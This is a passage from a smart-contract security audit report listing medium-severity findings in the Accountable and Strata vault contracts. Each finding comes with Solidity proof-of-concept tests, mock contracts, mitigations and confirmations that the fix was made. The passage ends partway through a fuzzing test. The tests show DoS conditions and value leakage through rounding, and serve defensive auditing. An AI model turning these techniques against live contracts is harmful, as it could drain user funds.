**Description:** Function `createYieldStrategy` deploys instances of the `AccountableYield` strategy using the `Create2` library's `deploy` function. After deployment, it ensures the `strategyProxy` is not `address(0)`.
```solidity
strategyProxy = Create2.deploy(0, params.salt, strategyProxyBytecode);
if (strategyProxy == address(0)) revert FailedDeployment(ZERO_LOAN_PROXY_ADDRESS);
```

However, this is not required since the `deploy` function already checks for this and reverts early.

```solidity
function deploy(uint256 amount, bytes32 salt, bytes memory bytecode) internal returns (address addr) {
        if (address(this).balance < amount) {
            revert Create2InsufficientBalance(address(this).balance, amount);
        }
        if (bytecode.length == 0) {
            revert Create2EmptyBytecode();
        }
        /// @solidity memory-safe-assembly
        assembly {
            addr := create2(amount, add(bytecode, 0x20), mload(bytecode), salt)
        }
        if (addr == address(0)) {
            revert Create2FailedDeployment();
        }
    }
```

**Recommended Mitigation:** Consider removing the zero address check

```diff
- if (strategyProxy == address(0)) revert FailedDeployment(ZERO_LOAN_PROXY_ADDRESS);
```

**Accountable:** Fixed in commit [`ec3b6b9`](https://github.com/Accountable-Protocol/credit-vaults-internal/commit/ec3b6b9d9e8c4bcaae7b913c1f00a2c6a11a4636)

**Cyfrin:** Verified. Optimization also done for Open- and FixedTerm factories.

## [M-63] Consider reverting in `publishedDataByBatchId` for invalid batch IDs
- Severity: `Medium`
- Source report: `pr50.md`

### Detailed Content (from source)
**Description:** Function `publishedDataByBatchId` returns published data however it does not ensure the `id` parameter is less than the `currentBatchId`. Due to this, the function will still return an empty PublishedData struct for invalid IDs. While this poses no immediate risk, it is safer to reject invalid ID values to avoid issues in the future with integrations.

```solidity
function publishedDataByBatchId(uint256 id) external view returns (PublishedData memory) {
        return _publishedData[id];
    }
```

**Recommended Mitigation:** Consider reverting if `id` is greater than or equal to the `currentBatchId`.

**Accountable:** Fixed in commit [`d721846`](https://github.com/Accountable-Protocol/credit-vaults-internal/commit/d721846475486afd796fd6fa159e95143e7d4b98)

**Cyfrin:** Verified.

\clearpage
## Gas Optimization

## [M-64] Increasing `AccountableOpenTerm.loan.withdrawalPeriod` from `0` can cause withdrawals to become stuck
- Severity: `Medium`
- Source report: `pr50.md`

### Detailed Content (from source)
**Description:** When `LoanTerms.withdrawalPeriod == 0`, `AccountableOpenTerm::_createOrAddWithdrawalBatch` returns immediately and does not create/update any batch metadata.

However, users can still end up queued (e.g., insufficient liquidity → `requestRedeem()` is not immediately fulfillable). If terms are later updated to a non-zero `withdrawalPeriod`, `_processAvailableWithdrawals()` switches into “batch mode” and processes shares bounded by `WithdrawalBatch.totalShares`, meaning queued shares that were accumulated while `withdrawalPeriod == 0` may have no corresponding batch totals to drive processing.

**Impact:** Queued withdrawals created while `withdrawalPeriod == 0` can become stuck or perceived as stuck after switching to `withdrawalPeriod > 0`, because batch-mode processing depends on batch metadata that was never created for those queued shares. This can lead to delayed withdrawals and operational term toggling to recover.

**Recommended mitigation:**
Either don't allow increases of the `withdrawalPeriod` when there's still queued shares or:

When transitioning from `withdrawalPeriod == 0` → `withdrawalPeriod > 0`, ensure queued withdrawals are materialized into batch metadata. Options include:

* In `acceptTerms()` (or the terms-activation path), if the *new* `withdrawalPeriod > 0` and `totalQueuedShares() > 0`, **initialize/seed** the current batch with `totalShares = totalQueuedShares()`, with appropriate `startTime/expiry` alignment.
* Alternatively, adjust `_processAvailableWithdrawals()` so that if `withdrawalPeriod > 0` but batch metadata is missing/empty while the queue is non-empty, it either:

  * falls back to the “zero-period” processing path once, or
  * auto-creates a batch reflecting the current queued amount before processing.

**Accountable:** Fixed in commit [`10396d4`](https://github.com/Accountable-Protocol/credit-vaults-internal/commit/10396d49bbdd747cf76e961091a2c869b1194a27)

**Cyfrin:** Verified. `acceptTerms` now reverts if the withdrawal period is increased from 0 and there's still queued shares.

## [M-65] `pUSDeVault::maxDeposit` doesn't account for deposit pausing, in violation of EIP-4626 which can break protocols integrating with `pUSDeVault`
- Severity: `Medium`
- Source report: `predeposit.md`

### Detailed Content (from source)
**Description:** [EIP-4626](https://eips.ethereum.org/EIPS/eip-4626) states on `maxDeposit`:
> MUST factor in both global and user-specific limits, like if deposits are entirely disabled (even temporarily) it MUST return 0.

`pUSDeVault::maxDeposit` doesn't account for deposit pausing, in violation of EIP-4626 which can break protocols integrating with `pUSDeVault`.

**Proof of Concept:**
```solidity
function test_maxDeposit_WhenDepositsPaused() external {
    // admin pauses deposists
    pUSDe.setDepositsEnabled(false);

    // reverts as maxDeposit returns uint256.max even though
    // attempting to deposit would revert
    assertEq(pUSDe.maxDeposit(user1), 0);

    // https://eips.ethereum.org/EIPS/eip-4626 maxDeposit says:
    // MUST factor in both global and user-specific limits,
    // like if deposits are entirely disabled (even temporarily) it MUST return 0.
}
```

**Recommended Mitigation:** When deposits are paused, `maxDeposit` should return 0. The override of `maxDeposit` should likely be done in `PreDepositVault` because there is where the pausing is implemented.

**Strata:** Fixed in commit [8021069](https://github.com/Strata-Money/contracts/commit/80210696f5ebe73ad7fca071c1c1b7d82e2b02ae).

**Cyfrin:** Verified.

## [M-66] `pUSDeVault::maxMint` doesn't account for mint pausing, in violation of EIP-4626 which can break protocols integrating with `pUSDeVault`
- Severity: `Medium`
- Source report: `predeposit.md`

### Detailed Content (from source)
**Description:** [EIP-4626](https://eips.ethereum.org/EIPS/eip-4626) states on `maxMint`:
> MUST factor in both global and user-specific limits, like if mints are entirely disabled (even temporarily) it MUST return 0.

`pUSDeVault::maxMint` doesn't account for mint pausing, in violation of EIP-4626 which can break protocols integrating with `pUSDeVault`. Since `MetaVault::mint` uses `_deposit`, mints will be paused when deposits are paused.

**Proof of Concept:**
```solidity
function test_maxMint_WhenDepositsPaused() external {
    // admin pauses deposists
    pUSDe.setDepositsEnabled(false);

    // should revert here as maxMint should return 0
    // since deposits are paused and `MetaVault::mint` uses `_deposit`
    assertEq(pUSDe.maxMint(user1), type(uint256).max);

    // attempt to mint to show the error
    uint256 user1AmountInMainVault = 1000e18;
    USDe.mint(user1, user1AmountInMainVault);

    vm.startPrank(user1);
    USDe.approve(address(pUSDe), user1AmountInMainVault);
    // reverts with DepositsDisabled since `MetaVault::mint` uses `_deposit`
    uint256 user1MainVaultShares = pUSDe.mint(user1AmountInMainVault, user1);
    vm.stopPrank();

    // https://eips.ethereum.org/EIPS/eip-4626 maxMint says:
    // MUST factor in both global and user-specific limits,
    // like if mints are entirely disabled (even temporarily) it MUST return 0.
}
```

**Recommended Mitigation:** When deposits are paused, `maxMint` should return 0. The override of `maxMint` should likely be done in `PreDepositVault` because there is where the pausing is implemented.

**Strata:** Fixed in commit [8021069](https://github.com/Strata-Money/contracts/commit/80210696f5ebe73ad7fca071c1c1b7d82e2b02ae).

**Cyfrin:** Verified.

## [M-67] `pUSDeVault::startYieldPhase` should not remove supported vaults from being supported or should prevent new supported vaults once in the yield phase
- Severity: `Medium`
- Source report: `predeposit.md`

### Detailed Content (from source)
**Description:** The intention of `pUSDeVault::startYieldPhase` is to convert assets from existing supported vaults into `USDe` in order to then stake the vault's total `USDe` into the `sUSDe` vault.

However because this ends up calling `MetaVault::removeVaultAndRedeemInner`, all the supported vaults are also removed after their assets are converted.

But new vaults can continue to be added during the yield phase, so it makes no sense to remove all supported vaults at this time.

**Impact:** The contract owner will need to re-add all the previously enabled supported vaults causing all user deposits to revert until this is done.

**Proof Of Concept:**
```solidity
function test_supportedVaultsRemovedWhenYieldPhaseEnabled() external {
    // supported vault prior to yield phase
    assertTrue(pUSDe.isAssetSupported(address(eUSDe)));

    // user1 deposits $1000 USDe into the main vault
    uint256 user1AmountInMainVault = 1000e18;
    USDe.mint(user1, user1AmountInMainVault);

    vm.startPrank(user1);
    USDe.approve(address(pUSDe), user1AmountInMainVault);
    uint256 user1MainVaultShares = pUSDe.deposit(user1AmountInMainVault, user1);
    vm.stopPrank();

    // admin triggers yield phase on main vault
    pUSDe.startYieldPhase();

    // supported vault was removed when initiating yield phase
    assertFalse(pUSDe.isAssetSupported(address(eUSDe)));

    // but can be added back in?
    pUSDe.addVault(address(eUSDe));
    assertTrue(pUSDe.isAssetSupported(address(eUSDe)));

    // what was the point of removing it if it can be re-added
    // and used again during the yield phase?
}
```

**Recommended Mitigation:** Don't remove all supported vaults when calling `pUSDeVault::startYieldPhase`; just convert their assets to `USDe` but continue to allow the vaults themselves to be supported and accept future deposits.

Alternatively don't allow supported vaults to be added during the yield phase (apart from sUSDe which is added when the yield phase is enabled). In this case removing them when enabled the yield phase is fine, but add code to disallow adding them once the yield phase is enabled.

**Strata:** Fixed in commit [076d23e](https://github.com/Strata-Money/contracts/commit/076d23e2446ad6780b2c014d66a46e54425a8769#diff-34cf784187ffa876f573d51b705940947bc06ec85f8c303c1b16a4759f59524eR190) by no longer allowing adding new supporting vaults during the yield phase.

**Cyfrin:** Verified.

## [M-68] `yUSDeVault` edge cases should be explicitly handled to prevent view functions from reverting
- Severity: `Medium`
- Source report: `predeposit.md`

### Detailed Content (from source)
**Description:** Per the ERC-4626 specification, the preview functions "MUST NOT revert due to vault specific user/global limits. MAY revert due to other conditions that would also cause mint/deposit/redeem/withdraw to revert".

```solidity
    function totalAccruedUSDe() public view returns (uint256) {
@>      uint pUSDeAssets = super.totalAssets();  // @audit - should return early if pUSDeAssets is zero to avoid reverting in the call below

@>      uint USDeAssets = _convertAssetsToUSDe(pUSDeAssets, true);
        return USDeAssets;
    }

    function _convertAssetsToUSDe (uint pUSDeAssets, bool withYield) internal view returns (uint256) {
@>      uint sUSDeAssets = pUSDeVault.previewRedeem(withYield ? address(this) : address(0), pUSDeAssets); // @audit - this can revert if passing yUSDe as the caller when it has no pUSDe balance
        uint USDeAssets = sUSDe.previewRedeem(sUSDeAssets);
        return USDeAssets;
    }

    function previewDeposit(uint256 pUSDeAssets) public view override returns (uint256) {
        uint underlyingUSDe = _convertAssetsToUSDe(pUSDeAssets, false);

@>      uint yUSDeShares = _valueMulDiv(underlyingUSDe, totalAssets(), totalAccruedUSDe(), Math.Rounding.Floor); // @audit - should explicitly handle the case where totalAccruedUSDe() returns zero rather than relying on _valueMulDiv() behaviour
        return yUSDeShares;
    }

    function previewMint(uint256 yUSDeShares) public view override returns (uint256) {
@>      uint underlyingUSDe = _valueMulDiv(yUSDeShares, totalAccruedUSDe(), totalAssets(), Math.Rounding.Ceil); // @audit - should explicitly handle the case where totalAccruedUSDe() and/or totalAssets() returns zero rather than relying on _valueMulDiv() behaviour
        uint pUSDeAssets = pUSDeVault.previewDeposit(underlyingUSDe);
        return pUSDeAssets;
    }

    function _valueMulDiv(uint256 value, uint256 mulValue, uint256 divValue, Math.Rounding rounding) internal view virtual returns (uint256) {
        return value.mulDiv(mulValue + 1, divValue + 1, rounding);
    }
```

As noted using `// @audit` tags in the code snippets above, `yUSDeVault::previewMint` and `yUSDeVault::previewDeposit` can revert for multiple reasons, including:
* when the pUSDe balance of the yUSDe vault is zero.
* when `pUSDeVault::previewRedeem` reverts due to division by zero in `pUSDeVault::previewYield`, invoked from `_convertAssetsToUSDe()` within `totalAccruedUSDe()`.

```solidity
     function previewYield(address caller, uint256 shares) public view virtual returns (uint256) {
        if (PreDepositPhase.YieldPhase == currentPhase && caller == address(yUSDe)) {

            uint total_sUSDe = sUSDe.balanceOf(address(this));
            uint total_USDe = sUSDe.previewRedeem(total_sUSDe);

            uint total_yield_USDe = total_USDe - Math.min(total_USDe, depositedBase);

@>          uint y_pUSDeShares = balanceOf(caller); // @audit - should return early if this is zero to avoid reverting below
@>          uint caller_yield_USDe = total_yield_USDe.mulDiv(shares, y_pUSDeShares, Math.Rounding.Floor);

            return caller_yield_USDe;
        }
        return 0;
    }

    function previewRedeem(address caller, uint256 shares) public view virtual returns (uint256) {
        return previewRedeem(shares) + previewYield(caller, shares);
    }
```

While a subset of these reverts could be considered "due to other conditions that would also cause deposit to revert", such as due to overflow, it would be better to explicitly handle these other edge cases. Additionally, even when called in isolation `yUSDeVault::totalAccruedUSDe` will revert if the pUSDe balance of the yUSDeVault is zero. Instead, this should simply return zero.

**Strata:** Fixed in commit [0f366e1](https://github.com/Strata-Money/contracts/commit/0f366e192941c875b651ee4db89b9fd3242a5ac0).

**Cyfrin:** Verified. The zero assets/shares edge cases are now explicitly handled in `yUSDeVault::_convertAssetsToUSDe` and pUSDeVault::previewYield`, including when the `yUSDe` state is not initialized as so will be equal to the zero address.

\clearpage

## [M-69] DoS of meta vault withdrawals during points phase if one vault is paused or attempted redemption exceeds the maximum
- Severity: `Medium`
- Source report: `predeposit.md`

### Detailed Content (from source)
**Description:** `pUSDeVault::_withdraw` assumes any `USDe` shortfall is covered by the multi-vaults; however, `redeemRequiredBaseAssets()` does not guarantee that the required assets are available or actually withdrawn, so the subsequent ERC-20 token transfer could fail and DoS withdrawals if the ERC-4626 withdrawal does not already revert. Usage of `ERC4626Upgradeable::previewRedeem` in `redeemRequiredBaseAssets()` is problematic as this could attempt to withdraw more assets than the vault will allow. Per the [ERC-4626 specification](https://eips.ethereum.org/EIPS/eip-4626), `previewRedeem()`:
> * MUST NOT account for redemption limits like those returned from maxRedeem and should always act as though the redemption would be accepted, regardless if the user has enough shares, etc.
> * MUST NOT revert due to vault specific user/global limits. MAY revert due to other conditions that would also cause redeem to revert.

So an availability-aware check such as `maxWithdraw()` which considers pause states and any other limits should be used instead to prevent one vault reverting when it may be possible to process the withdrawal by redeeming from another.

**Impact:** If one of the supported meta vaults is paused or experiences a hack of the underlying `USDe` which results in a decrease in share price during the points phase then this will prevent withdrawals from being processed even if it is possible to do so by redeeming from another.

**Proof of Concept:** First modify the `MockERC4626` to simulate a vault that pauses deposits/withdrawals and could return fewer assets when querying `maxWithdraw()` when compared with `previewRedeem()`:

```solidity
contract MockERC4626 is ERC4626 {
    bool public depositsEnabled;
    bool public withdrawalsEnabled;
    bool public hacked;

    error DepositsDisabled();
    error WithdrawalsDisabled();

    event DepositsEnabled(bool enabled);
    event WithdrawalsEnabled(bool enabled);

    constructor(IERC20 token) ERC20("MockERC4626", "M4626") ERC4626(token)  {}

    function _deposit(address caller, address receiver, uint256 assets, uint256 shares) internal override {
        if (!depositsEnabled) {
            revert DepositsDisabled();
        }

        super._deposit(caller, receiver, assets, shares);
    }

    function _withdraw(address caller, address receiver, address owner, uint256 assets, uint256 shares)
        internal
        override
    {
        if (!withdrawalsEnabled) {
            revert WithdrawalsDisabled();
        }

        super._withdraw(caller, receiver, owner, assets, shares);
    }

    function maxWithdraw(address owner) public view override returns (uint256) {
        if (!withdrawalsEnabled) {
            revert WithdrawalsDisabled();
        }

        if (hacked) {
            return super.maxWithdraw(owner) / 2; // Reduce max withdraw by half to simulate some limit
        }
        return super.maxWithdraw(owner);
    }

    function totalAssets() public view override returns (uint256) {
        if (hacked) {
            return super.totalAssets() * 3/4; // Reduce total assets by 25% to simulate some loss
        }
        return super.totalAssets();
    }

    function setDepositsEnabled(bool depositsEnabled_) external {
        depositsEnabled = depositsEnabled_;
        emit DepositsEnabled(depositsEnabled_);
    }

    function setWithdrawalsEnabled(bool withdrawalsEnabled_) external {
        withdrawalsEnabled = withdrawalsEnabled_;
        emit WithdrawalsEnabled(withdrawalsEnabled_);
    }

    function hack() external {
        hacked = true;
    }
}
```

The following test can then be run in `pUSDeVault.t.sol`:
```solidity
error WithdrawalsDisabled();
error ERC4626ExceededMaxWithdraw(address owner, uint256 assets, uint256 max);
error ERC20InsufficientBalance(address from, uint256 balance, uint256 amount);

function test_redeemRequiredBaseAssetsDoS() public {
    assert(address(USDe) != address(0));

    account = msg.sender;

    // deposit USDe
    USDe.mint(account, 10 ether);
    deposit(USDe, 10 ether);
    assertBalance(pUSDe, account, 10 ether, "Initial deposit");

    // deposit eUSDe
    USDe.mint(account, 10 ether);
    USDe.approve(address(eUSDe), 10 ether);
    eUSDe.setDepositsEnabled(true);
    eUSDe.deposit(10 ether, account);
    assertBalance(eUSDe, account, 10 ether, "Deposit to eUSDe");
    eUSDe.approve(address(pUSDeDepositor), 10 ether);
    pUSDeDepositor.deposit(eUSDe, 10 ether, account);

    // simulate trying to withdraw from the eUSDe vault when it is paused
    uint256 withdrawAmount = 20 ether;
    eUSDe.setWithdrawalsEnabled(false);
    vm.expectRevert(abi.encodeWithSelector(WithdrawalsDisabled.selector));
    pUSDe.withdraw(address(USDe), withdrawAmount, account, account);
    eUSDe.setWithdrawalsEnabled(true);


    // deposit USDe from another account
    account = address(0x1234);
    vm.startPrank(account);
    USDe.mint(account, 10 ether);
    USDe.approve(address(eUSDe), 10 ether);
    eUSDe.deposit(10 ether, account);
    assertBalance(eUSDe, account, 10 ether, "Deposit to eUSDe");
    eUSDe.approve(address(pUSDeDepositor), 10 ether);
    pUSDeDepositor.deposit(eUSDe, 10 ether, account);
    vm.stopPrank();
    account = msg.sender;
    vm.startPrank(account);

    // deposit eUSDe2
    USDe.mint(account, 5 ether);
    USDe.approve(address(eUSDe2), 5 ether);
    eUSDe2.setDepositsEnabled(true);
    eUSDe2.deposit(5 ether, account);
    assertBalance(eUSDe2, account, 5 ether, "Deposit to eUSDe2");
    eUSDe2.approve(address(pUSDeDepositor), 5 ether);
    pUSDeDepositor.deposit(eUSDe2, 5 ether, account);


    // simulate when previewRedeem() in redeemRequiredBaseAssets() returns more than maxWithdraw() during withdrawal
    // as a result of a hack and imposition of a limit
    eUSDe.hack();
    uint256 maxWithdraw = eUSDe.maxWithdraw(address(pUSDe));
    vm.expectRevert(abi.encodeWithSelector(ERC4626ExceededMaxWithdraw.selector, address(pUSDe), withdrawAmount/2, maxWithdraw));
    pUSDe.withdraw(address(USDe), withdrawAmount, account, account);

    // attempt to withdraw from eUSDe2 vault, but redeemRequiredBaseAssets() skips withdrawal attempt
    // so there are insufficient assets to cover the subsequent transfer even though there is enough in the vaults
    eUSDe2.setWithdrawalsEnabled(true);
    vm.expectRevert(abi.encodeWithSelector(ERC20InsufficientBalance.selector, address(pUSDe), eUSDe2.balanceOf(address(pUSDe)), withdrawAmount));
    pUSDe.withdraw(address(eUSDe2), withdrawAmount, account, account);
}
```

**Recommended Mitigation:**
```diff
    function redeemRequiredBaseAssets (uint baseTokens) internal {
        for (uint i = 0; i < assetsArr.length; i++) {
            IERC4626 vault = IERC4626(assetsArr[i].asset);
--          uint totalBaseTokens = vault.previewRedeem(vault.balanceOf(address(this)));
++          uint256 totalBaseTokens = vault.maxWithdraw(address(this));
            if (totalBaseTokens >= baseTokens) {
                vault.withdraw(baseTokens, address(this), address(this));
                break;
            }
        }
    }
```

**Strata:** Fixed in commit [4efba0c](https://github.com/Strata-Money/contracts/commit/4efba0c484a3bd6d4934e0f1ec0eb91848c94298).

**Cyfrin:** Verified.

## [M-70] Duplicate vaults can be pushed to `assetsArr`
- Severity: `Medium`
- Source report: `predeposit.md`

### Detailed Content (from source)
**Description:** While `MetaVault::addVault` is protected by the `onlyOwner` modifier, there is no restriction on the number of times this function can be called with a given `vaultAddress` as argument:

```solidity
    function addVault(address vaultAddress) external onlyOwner {
        addVaultInner(vaultAddress);
    }

    function addVaultInner (address vaultAddress) internal {
        TAsset memory vault = TAsset(vaultAddress, EAssetType.ERC4626);
        assetsMap[vaultAddress] = vault;
@>      assetsArr.push(vault);

        emit OnVaultAdded(vaultAddress);
    }
```

In such a scenario, the vault will become duplicated within the `assetsArr` array. When called in `pUSDeVault::startYieldPhase`, the core redemption logic of `MetaVault::redeemMetaVaults` continues to function as expected. During the second iteration for the given vault address, the contract balance will simply be zero, so the redemption will be skipped, the `assetsMap` entry will again be re-written to default values, and the duplicate element will be removed from the array:

```solidity
    function removeVaultAndRedeemInner (address vaultAddress) internal {
        // Redeem
        uint balance = IERC20(vaultAddress).balanceOf(address(this));
@>      if (balance > 0) {
@>          IERC4626(vaultAddress).redeem(balance, address(this), address(this));
        }

        // Clean
        TAsset memory emptyAsset;
@>      assetsMap[vaultAddress] = emptyAsset;
        uint length = assetsArr.length;
        for (uint i = 0; i < length; i++) {
            if (assetsArr[i].asset == vaultAddress) {
                assetsArr[i] = assetsArr[length - 1];
@>              assetsArr.pop();
                break;
            }
        }
    }

    /// @dev Internal method to redeem all assets from supported vaults
    /// @notice Iterates through all supported vaults and redeems their assets for the base token
    function redeemMetaVaults () internal {
        while (assetsArr.length > 0) {
@>          removeVaultAndRedeemInner(assetsArr[0].asset);
        }
    }
```

However, if the given vault is removed from the list of supported vaults, `MetaVault::removeVault` will not allow the duplicate entry to be removed since the `requireSupportedVault()` invocation would fail on any subsequent attempt given that the mapping state is already overwritten to `address(0)` in the `removeVaultAndRedeemInner()` invocation:

```solidity
    function requireSupportedVault(address token) internal view {
@>      address vaultAddress = assetsMap[token].asset;
        if (vaultAddress == address(0)) {
            revert UnsupportedAsset(token);
        }
    }

    function removeVault(address vaultAddress) external onlyOwner {
@>      requireSupportedVault(vaultAddress);
        removeVaultAndRedeemInner(vaultAddress);

        emit OnVaultRemoved(vaultAddress);
    }
```

The consequence of this depends on the intentions of the owner:
* If they intend to keep the vault supported, all `MetaVault` functionality relying on the specified asset being a supported vault will revert if it has been attempted by the owner to remove a duplicated vault.
* If they intend to completely remove the vault, this will not be possible; however, it will also not be possible to make any subsequent deposits, so impact is limited to redeeming during the transition to the yield phase rather than instantaneously.

**Impact:** Vault assets could be redeemed later than intended and users could be temporarily prevented from withdrawing their funds.

**Proof of Concept:** The following test should be included in `pUSDeVault.t.sol`:

```solidity
function test_duplicateVaults() public {
    pUSDe.addVault(address(eUSDe));
    pUSDe.removeVault(address(eUSDe));
    assertFalse(pUSDe.isAssetSupported(address(eUSDe)));
    vm.expectRevert();
    pUSDe.removeVault(address(eUSDe));
}
```

**Recommended Mitigation:** Revert if the given vault has already been added.

**Strata:** Fixed in commit [787d1c7](https://github.com/Strata-Money/contracts/commit/787d1c72e86308897f06af775ed30b8dbef4cf2b).

**Cyfrin:** Verified.

## [M-71] Remove unused return value from `pUSDeVault::stakeUSDe` and explicitly revert if `USDeAssets == 0`
- Severity: `Medium`
- Source report: `predeposit.md`

### Detailed Content (from source)
**Description:** Remove unused return value from `pUSDeVault::stakeUSDe` and explicitly revert if `USDeAssets == 0`.

**Strata:** Fixed in commit [513d589](https://github.com/Strata-Money/contracts/commit/513d5890771d9bbe520740ef8f26a24931bf5590).

**Cyfrin:** Verified.

## [M-72] Value leakage due to pUSDe redemptions rounding against the protocol/yUSDe depositors
- Severity: `Medium`
- Source report: `predeposit.md`

### Detailed Content (from source)
**Description:** After transitioning to the yield phase, redemptions of both pUSDe and yUSDe are processed by `pUSDeVault::_withdraw` such that they are both paid out in sUSDe. This is achieved by computing the sUSDe balance corresponding to the required USDe amount by calling its `previewWithdraw()` function:

```solidity
    function _withdraw(address caller, address receiver, address owner, uint256 assets, uint256 shares) internal override {

            if (PreDepositPhase.YieldPhase == currentPhase) {
                // sUSDeAssets = sUSDeAssets + user_yield_sUSDe
@>              assets += previewYield(caller, shares);

@>              uint sUSDeAssets = sUSDe.previewWithdraw(assets); // @audit - this rounds up because sUSDe requires the amount of sUSDe burned to receive assets amount of USDe to round up, but below we are transferring this rounded value out to the receiver which actually rounds against the protocol/yUSDe depositors!

                _withdraw(
                    address(sUSDe),
                    caller,
                    receiver,
                    owner,
                    assets, // @audit - this should not include the yield, since it is decremented from depositedBase
                    sUSDeAssets,
                    shares
                );
                return;
            }
        ...
    }
```

The issue with this is that `previewWithdraw()` returns the required sUSDe balance that must be burned to receive the specified USDe amount and so rounds up accordingly; however, here this rounded sUSDe amount is being transferred out of the protocol. This means that the redemption actually rounds in favour of the receiver and against the protocol/yUSDe depositors.

**Impact:** Value can leak from the system in favour of pUSDe redemptions at the expense of other yUSDe depositors.

**Proof of Concept:** Note that the following test will revert due to underflow when attempting to determine the fully redeemed amounts unless the mitigation from C-01 is applied:

```solidity
pragma solidity 0.8.28;

import {Test} from "forge-std/Test.sol";
import {ERC1967Proxy} from "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";
import {IERC4626} from "@openzeppelin/contracts/interfaces/IERC4626.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";

import {MockUSDe} from "../contracts/test/MockUSDe.sol";
import {MockStakedUSDe} from "../contracts/test/MockStakedUSDe.sol";
import {MockERC4626} from "../contracts/test/MockERC4626.sol";

import {pUSDeVault} from "../contracts/predeposit/pUSDeVault.sol";
import {yUSDeVault} from "../contracts/predeposit/yUSDeVault.sol";

import {console2} from "forge-std/console2.sol";

contract RoundingTest is Test {
    uint256 constant MIN_SHARES = 0.1 ether;

    MockUSDe public USDe;
    MockStakedUSDe public sUSDe;
    pUSDeVault public pUSDe;
    yUSDeVault public yUSDe;

    address account;

    address alice = makeAddr("alice");
    address bob = makeAddr("bob");

    function setUp() public {
        address owner = msg.sender;

        USDe = new MockUSDe();
        sUSDe = new MockStakedUSDe(USDe, owner, owner);

        pUSDe = pUSDeVault(
            address(
                new ERC1967Proxy(
                    address(new pUSDeVault()),
                    abi.encodeWithSelector(pUSDeVault.initialize.selector, owner, USDe, sUSDe)
                )
            )
        );

        yUSDe = yUSDeVault(
            address(
                new ERC1967Proxy(
                    address(new yUSDeVault()),
                    abi.encodeWithSelector(yUSDeVault.initialize.selector, owner, USDe, sUSDe, pUSDe)
                )
            )
        );

        vm.startPrank(owner);
        pUSDe.setDepositsEnabled(true);
        pUSDe.setWithdrawalsEnabled(true);
        pUSDe.updateYUSDeVault(address(yUSDe));

        // deposit USDe and burn minimum shares to avoid reverting on redemption
        uint256 initialUSDeAmount = pUSDe.previewMint(MIN_SHARES);
        USDe.mint(owner, initialUSDeAmount);
        USDe.approve(address(pUSDe), initialUSDeAmount);
        pUSDe.mint(MIN_SHARES, address(0xdead));
        vm.stopPrank();

        if (pUSDe.balanceOf(address(0xdead)) != MIN_SHARES) {
            revert("address(0xdead) should have MIN_SHARES shares of pUSDe");
        }
    }

    function test_rounding() public {
        uint256 userDeposit = 100 ether;

        // fund users
        USDe.mint(alice, userDeposit);
        USDe.mint(bob, userDeposit);

        // alice deposits into pUSDe
        vm.startPrank(alice);
        USDe.approve(address(pUSDe), userDeposit);
        uint256 aliceShares_pUSDe = pUSDe.deposit(userDeposit, alice);
        vm.stopPrank();

        // bob deposits into pUSDe
        vm.startPrank(bob);
        USDe.approve(address(pUSDe), userDeposit);
        uint256 bobShares_pUSDe = pUSDe.deposit(userDeposit, bob);
        vm.stopPrank();

        // setup assertions
        assertEq(pUSDe.balanceOf(alice), aliceShares_pUSDe, "Alice should have shares equal to her deposit");
        assertEq(pUSDe.balanceOf(bob), bobShares_pUSDe, "Bob should have shares equal to his deposit");

        {
            // phase change
            account = msg.sender;
            uint256 initialAdminTransferAmount = 1e6;
            vm.startPrank(account);
            USDe.mint(account, initialAdminTransferAmount);
            USDe.approve(address(pUSDe), initialAdminTransferAmount);
            pUSDe.deposit(initialAdminTransferAmount, address(yUSDe));
            pUSDe.startYieldPhase();
            yUSDe.setDepositsEnabled(true);
            yUSDe.setWithdrawalsEnabled(true);
            vm.stopPrank();
        }

        // bob deposits into yUSDe
        vm.startPrank(bob);
        pUSDe.approve(address(yUSDe), bobShares_pUSDe);
        uint256 bobShares_yUSDe = yUSDe.deposit(bobShares_pUSDe, bob);
        vm.stopPrank();

        // simulate sUSDe yield transfer
        uint256 sUSDeYieldAmount = 1_000 ether;
        USDe.mint(address(sUSDe), sUSDeYieldAmount);

        // alice redeems from pUSDe
        uint256 aliceBalanceBefore_sUSDe = sUSDe.balanceOf(alice);
        vm.prank(alice);
        uint256 aliceRedeemed_USDe_reported = pUSDe.redeem(aliceShares_pUSDe, alice, alice);
        uint256 aliceRedeemed_sUSDe = sUSDe.balanceOf(alice) - aliceBalanceBefore_sUSDe;
        uint256 aliceRedeemed_USDe_actual = sUSDe.previewRedeem(aliceRedeemed_sUSDe);

        // bob redeems from yUSDe
        uint256 bobBalanceBefore_sUSDe = sUSDe.balanceOf(bob);
        vm.prank(bob);
        uint256 bobRedeemed_pUSDe_reported = yUSDe.redeem(bobShares_yUSDe, bob, bob);
        uint256 bobRedeemed_sUSDe = sUSDe.balanceOf(bob) - bobBalanceBefore_sUSDe;
        uint256 bobRedeemed_USDe = sUSDe.previewRedeem(bobRedeemed_sUSDe);

        console2.log("Alice redeemed sUSDe: %s", aliceRedeemed_sUSDe);
        console2.log("Alice redeemed USDe (reported): %s", aliceRedeemed_USDe_reported);
        console2.log("Alice redeemed USDe (actual): %s", aliceRedeemed_USDe_actual);

        console2.log("Bob redeemed pUSDe (reported): %s", bobRedeemed_pUSDe_reported);
        console2.log("Bob redeemed pUSDe (actual): %s", bobShares_pUSDe);
        console2.log("Bob redeemed sUSDe: %s", bobRedeemed_sUSDe);
        console2.log("Bob redeemed USDe: %s", bobRedeemed_USDe);

        // post-redemption assertions
        assertEq(
            aliceRedeemed_USDe_reported,
            aliceRedeemed_USDe_actual,
            "Alice's reported and actual USDe redemption amounts should match"
        );

        assertGe(
            bobRedeemed_pUSDe_reported,
            bobShares_pUSDe,
            "Bob should redeem at least the same amount of pUSDe as his original deposit"
        );

        assertGe(
            bobRedeemed_USDe, userDeposit, "Bob should redeem at least the same amount of USDe as his initial deposit"
        );

        assertLe(
            aliceRedeemed_USDe_actual,
            userDeposit,
            "Alice should redeem no more than the same amount of USDe as her initial deposit"
        );
    }
}
```

The following Echidna optimization test can also be run to maximise this discrepancy:

```solidity
// SPDX-License-Identifier: GPL-2.0
pragma solidity ^0.8.0;

import {BaseSetup} from "@chimera/BaseSetup.sol";
import {CryticAsserts} from "@chimera/CryticAsserts.sol";
import {vm} from "@chimera/Hevm.sol";

import {pUSDeVault} from "contracts/predeposit/pUSDeVault.sol";
import {yUSDeVault} from "contracts/predeposit/yUSDeVault.sol";
import {MockUSDe} from "contracts/test/MockUSDe.sol";
